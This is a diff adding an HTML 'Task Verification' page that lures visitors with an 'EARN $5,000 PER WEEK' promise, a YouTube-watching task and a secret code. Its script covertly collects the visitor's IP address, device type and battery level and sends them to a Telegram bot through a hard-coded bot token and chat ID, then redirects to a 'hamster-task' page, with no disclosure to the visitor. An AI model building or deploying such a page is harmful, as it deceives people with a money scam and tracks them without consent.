@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Task Verification</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #2a1e12;
+            color: #fff;
+            text-align: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            background-color: #3b2a19;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        }
+        .header {
+            font-size: 18px;
+          
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: center;
+        }
+        .header div {
+            margin: 0 10px;
+          
+          }
+
+        .header {
+
+            margin-bottom: 20px;
+
+        }
+
+        .header img {
+
+            width: 100px;
+
+        }
+          
+        }
+        .task {
+            background-color: #4a3523 ;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 10px;
+        }
+        .task h3 {
+            margin: 10px 0;
+            color: 
+
+#FFFAFA;
+            font-size: 16px;
+        }
+      
+        a {
+            color: #f0d290;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        button {
+            background-color: #f0d290;
+            color: #3b2a19;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+            width: 100%;
+            font-weight: bold;
+        }
+        button:hover {
+            background-color: #e8c278;
+        }
+        input {
+            padding: 10px;
+            width: calc(100% - 24px);
+            margin-top: 10px;
+            border-radius: 5px;
+            border: none;
+            background-color: #fff;
+            color: #3b2a19;
+        }
+        .blurred {
+            filter: blur(5px);
+            pointer-events: none;
+        }
+        .notification {
+            background-color: #f0d290;
+            color: #3b2a19;
+            padding: 10px;
+            border-radius: 5px;
+            display: none;
+            margin-top: 10px;
+        }
+        .warning {
+            font-size: 12px;
+            color: #b3b3b3;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+  
+  <div class="header">
+        <img src="https://img.icons8.com/?size=100&id=iRgwumOATYL6&format=png&color=000000" alt="Coins">
+    </div>
+
+  
+    <div class="container">
+        <div class="header">
+            <div>YouTube Task 🗂️</div>
+           
+        </div>
+        <h2>EARN $5,000 PER WEEK</h2>
+        <p class='note'>WITH THIS SECRETS OF SUCCESSFUL ENTREPRENEURS</p>
+        <div class="task">
+            <h3>1. Watch the video via the link below:</h3>
+            <a href="https://youtu.be/g2kHGviD8eA?si=ajI4oqaYm2cNsVbZ" target="_blank" id="youtube-link" onclick="startTimer()">YOUTUBE CHANNEL ↗</a>
+        </div>
+        <div class="task" id="password-task" class="blurred">
+            <h3>2. Enter the secret code after watching the video:</h3>
+            <div id="blurred-section" class="blurred">
+                <input type="password" id="password-input" placeholder="Enter the secret code" />
+                <button onclick="verifyPassword()">VERIFY</button>
+            </div>
+            <div class="notification" id="notification"></div>
+        </div>
+        <div class="warning">
+            <p>This is a promo campaign. We cannot control or be held responsible for the content in there.</p>
+        </div>
+    </div>
+    <script>
+        let timer;
+
+        function startTimer() {
+            timer = setTimeout(() => {
+                document.getElementById('blurred-section').classList.remove('blurred');
+            }, 30000); // 30 seconds timer
+        }
+
+        async function getDeviceInfo() {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const ipAddress = ipData.ip;
+            
+            const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+            const batteryLevel = navigator.getBattery ? (await navigator.getBattery()).level * 100 + '%' : 'N/A';
+
+            return {
+                ipAddress,
+                deviceType,
+                batteryLevel,
+                timestamp: new Date().toLocaleString()
+            };
+        }
+
+        async function sendMessageToTelegram(message) {
+            const botToken = '7353904231:AAHA2En0ZVi092OlJpgR_aQG0TP0DXc0TPE';
+            const chatId = '5187944932';
+            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            await fetch(telegramApiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            });
+        }
+
+        async function verifyPassword() {
+            const input = document.getElementById('password-input').value;
+            const notification = document.getElementById('notification');
+            
+            if (input === '2222') {  // Replace '1234' with the correct password
+                notification.style.display = 'block';
+                notification.textContent = 'Successful 😀';
+                
+                const deviceInfo = await getDeviceInfo();
+                const message = `IP: ${deviceInfo.ipAddress}\nDevice: ${deviceInfo.deviceType}\nBattery: ${deviceInfo.batteryLevel}\nTime: ${deviceInfo.timestamp}`;
+                await sendMessageToTelegram(message);
+                
+                setTimeout(() => {
+                window.location.href = 'https://videotasks.blogspot.com/p/hamster-task.html'; // Replace with your actual link
+            }, 10);
+            } else {
+                notification.style.display = 'block';
+                notification.textContent = 'Incorrect code. Please try again.';
+                setTimeout(() => {
+                    notification.style.display = 'none';
+                }, 5000);
+            }
+        }
+    </script>
+</body>
+</html>
